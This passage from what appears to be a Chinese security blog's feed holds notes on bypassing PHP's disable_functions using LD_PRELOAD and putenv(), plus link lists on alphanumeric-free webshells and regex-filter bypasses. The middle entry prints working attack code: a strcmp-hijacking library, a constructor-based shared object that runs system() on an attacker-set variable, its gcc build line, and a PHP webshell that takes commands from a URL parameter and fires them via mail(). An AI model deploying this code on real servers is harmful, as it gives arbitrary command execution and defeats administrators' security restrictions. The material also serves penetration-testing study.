    <content type="html"><![CDATA[<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a><br><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html" target="_blank" rel="noopener">记一次拿webshell踩过的坑(如何用PHP编写一个不包含数字和字母的后门)</a></p><p> <a href="https://blog.csdn.net/mochu7777777/article/details/104631142" target="_blank" rel="noopener">https://blog.csdn.net/mochu7777777/article/details/104631142</a> </p><a id="more"></a><p><a href="https://blog.csdn.net/mochu7777777/article/details/104631142" target="_blank" rel="noopener">关于PHP正则的一些绕过方法)</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;一些不包含数字和字母的webshell&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;记一次拿webshell踩过的坑(如何用PHP编写一个不包含数字和字母的后门)&lt;/a&gt;&lt;/p&gt;&lt;p&gt; &lt;a href=&quot;https://blog.csdn.net/mochu7777777/article/details/104631142&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://blog.csdn.net/mochu7777777/article/details/104631142&lt;/a&gt; &lt;/p&gt;
    
    </summary>
    
    
      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>bypass_disable_functions</title>
    <link href="http://yoursite.com/2020/05/09/bypass-disable-functions/"/>
    <id>http://yoursite.com/2020/05/09/bypass-disable-functions/</id>
    <published>2020-05-09T02:22:11.000Z</published>
    <updated>2020-09-11T05:58:18.085Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://0xcreed.jxustctf.top/2019/10/bypass-disable-functions/" target="_blank" rel="noopener">bypass_disable_functions</a><br><a href="https://www.cnblogs.com/leixiao-/p/10612798.html" target="_blank" rel="noopener">LD_PRELOAD &amp; putenv() 绕过 disable_functions &amp; open_basedir</a><br><a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">深入浅出LD_PRELOAD &amp; putenv()</a><br><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">bypass_disablefunc_via_LD_PRELOAD</a></p><a id="more"></a><h3 id="bypass-disable-functions"><a href="#bypass-disable-functions" class="headerlink" title="bypass_disable_functions"></a>bypass_disable_functions</h3><p>一般而言，利用漏洞控制 web 启动新进程 a.bin，a.bin 内部调用系统函数 b()，b() 位于系统共享对象 c.so 中，所以系统为该进程加载共 c.so，想法在 c.so 前优先加载可控的 c_evil.so，c_evil.so 内含与 b() 同名的恶意函数，由于 c_evil.so 优先级较高，所以，a.bin 将调用到 c_evil.so 内 b() 而非系统的 c.so 内 b()，同时，c_evil.so 可控，达到执行恶意代码的目的。基于这一思路，常见突破 disable_functions 限制执行操作系统命令的方式为：</p><ul><li>编写一个原型为 uid_t getuid(void); 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 getuid_shadow.so；</li><li>运行 PHP 函数 putenv()，设定环境变量 LD_PRELOAD 为 getuid_shadow.so，以便后续启动新进程时优先加载该共享对象；( LD_PRELOAD是Unix中的一个环境变量，用于定义在程序运行前优先加载的动态链接库，LD和动态库有关，PRELOAD表示预加载，结合起来就是预先加载的动态库。通过这个环境变量，可以覆盖正常的函数库中的函数。)</li><li>运行 PHP 的 mail() 函数，mail() 内部启动新进程 /usr/sbin/sendmail，由于上一步 LD_PRELOAD 的作用，sendmail 调用的系统函数 getuid() 被优先级更好的 getuid_shadow.so 中的同名 getuid() 所劫持；</li><li>达到不调用 PHP 的各种命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。</li></ul><h4 id="a-c文件："><a href="#a-c文件：" class="headerlink" title="a.c文件："></a>a.c文件：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">  int main(int argc,char **argv)&#123;</span><br><span class="line">  char passwd[]=&quot;123456&quot;;</span><br><span class="line">  </span><br><span class="line">  if(argc&lt;2)&#123;</span><br><span class="line">  printf(&quot;input password!\n&quot;);</span><br><span class="line">  return 0;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  if(!strcmp(passwd,argv[1]))&#123;</span><br><span class="line">  printf(&quot;Correct\n&quot;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  else&#123;</span><br><span class="line">  printf(&quot;Invalid\n&quot;);  </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 如果是不知道密码的情况下，就可以编写一个动态函数库来覆盖掉strcmp函数恒返回0以达到任意密码都返回Correct </p><blockquote><p>-fPIC 作用于编译阶段，告诉编译器产生与位置无关代码(Position-Independent Code)， 则产生的代码中，没有绝对地址，全部使用相对地址，故而代码可以被加载器加载到内存的任意 位置，都可以正确的执行。这正是共享库所要求的，共享库被加载时，在内存的位置不是固定的</p></blockquote><h4 id="evil-c文件："><a href="#evil-c文件：" class="headerlink" title="evil.c文件："></a>evil.c文件：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int strcmp(const char *s1,const char *s2)&#123;</span><br><span class="line">    printf(&quot;evil function\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以绕过disable_functions,可以通过上传恶意so文件，劫持getuid(),达到命令执行目的。之所以劫持 getuid()，是因为 sendmail 程序会调用该函数（当然也可以为其他被调用的系统函数）</p><p>但是这种劫持函数的做法有很大的缺陷：</p><p> 一是，某些环境中，web 禁止启用 senmail、甚至系统上根本未安装 sendmail，也就谈不上劫持 getuid()，通常的 www-data 权限又不可能去更改 php.ini 配置、去安装 sendmail 软件；二是，即便目标可以启用 sendmail，由于未将主机名（hostname 输出）添加进 hosts 中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，www-data 也无法将主机名加入 hosts（如，127.0.0.1 lamp、lamp.、lamp.com）</p><h4 id="C-语言扩展修饰符"><a href="#C-语言扩展修饰符" class="headerlink" title="C 语言扩展修饰符"></a>C 语言扩展修饰符</h4><p>回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那就完全可以不依赖 sendmail 了</p><p>GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数。这一细节非常重要，很多朋友用 LD_PRELOAD 手法突破 disable_functions 无法做到百分百成功，正因为这个原因，<strong>不要局限于仅劫持某一函数，而应考虑拦劫启动进程这一行为</strong>。</p><p>此外，通过 LD_PRELOAD 劫持了启动进程的行为，劫持后又启动了另外的新进程，若不在新进程启动前取消 LD_PRELOAD，则将陷入无限循环，所以必须得删除环境变量 LD_PRELOAD。最直观的做法是调用 <code>unsetenv(&quot;LD_PRELOAD&quot;)</code></p><h4 id="putenv"><a href="#putenv" class="headerlink" title="putenv"></a>putenv</h4><p>PHP中putenv()函数用于设置服务器环境变量，仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putenv ( string $setting ) : bool</span><br></pre></td></tr></table></figure><p> 如 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putenv(&quot;LD_PRELOAD=/tmp/evil.so&quot;);</span><br></pre></td></tr></table></figure><h4 id="bypass-c文件："><a href="#bypass-c文件：" class="headerlink" title="bypass.c文件："></a>bypass.c文件：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">extern char** environ; //获取环境变量</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void preload (void)</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);</span><br><span class="line">    //获取EVIL_CMDLINE的值</span><br><span class="line">    int i;</span><br><span class="line">    //从环境变量中遍历“LD_PRELOAD”的位置，并将其值设为NULL。</span><br><span class="line">    //从而使下面的system()正常执行。</span><br><span class="line">    for (i = 0; environ[i]; ++i) &#123;</span><br><span class="line">            if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) &#123;</span><br><span class="line">                    environ[i][0] = &apos;\0&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 执行命令</span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC bypass.c -o bypass_x64.so</span><br></pre></td></tr></table></figure><h4 id="bypass-php"><a href="#bypass-php" class="headerlink" title="bypass.php:"></a>bypass.php:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;;</span><br><span class="line">    $cmd = $_GET[&quot;cmd&quot;];</span><br><span class="line">    $out_path = $_GET[&quot;outpath&quot;];</span><br><span class="line">    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;</span><br><span class="line">    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline); //设置EVIL_CMDLINE环境变量</span><br><span class="line">    $so_path = $_GET[&quot;sopath&quot;];</span><br><span class="line">    putenv(&quot;LD_PRELOAD=&quot; . $so_path);  //加载恶意动态库</span><br><span class="line">    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);  //利用mail函数触发恶意函数，跳转至__attribute__ ((__constructor__))修饰的函数。</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; </span><br><span class="line">    unlink($out_path);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;http://0xcreed.jxustctf.top/2019/10/bypass-disable-functions/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;bypass_disable_functions&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.cnblogs.com/leixiao-/p/10612798.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;LD_PRELOAD &amp;amp; putenv() 绕过 disable_functions &amp;amp; open_basedir&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/175403&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;深入浅出LD_PRELOAD &amp;amp; putenv()&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;bypass_disablefunc_via_LD_PRELOAD&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>php一些正则绕过</title>
    <link href="http://yoursite.com/2020/05/09/php%E4%B8%80%E4%BA%9B%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87/"/>
    <id>http://yoursite.com/2020/05/09/php%E4%B8%80%E4%BA%9B%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87/</id>
    <published>2020-05-09T00:23:44.000Z</published>
    <updated>2020-09-08T11:24:03.852Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/mochu7777777/article/details/104631142" target="_blank" rel="noopener">关于PHP正则的一些绕过方法</a><br><a href="https://blog.csdn.net/qq_38783875/article/details/85288671" target="_blank" rel="noopener">preg_match函数，正则匹配绕过</a><br><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/mochu7777777/article/details/104631142&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;关于PHP正则的一些绕过方法&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http
      
    
    </summary>
    
    
      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
</feed>
